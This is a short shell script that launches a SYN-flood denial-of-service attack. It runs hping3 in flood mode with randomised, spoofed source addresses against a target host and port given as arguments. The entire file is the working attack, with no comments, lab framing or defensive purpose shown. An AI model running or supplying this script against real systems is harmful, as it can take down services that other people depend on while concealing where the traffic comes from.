#!/bin/sh

TARGET="$1"
PORT="${2:-12345}"

exec hping3 --flood --rand-source -S -p "$PORT" "$TARGET" 
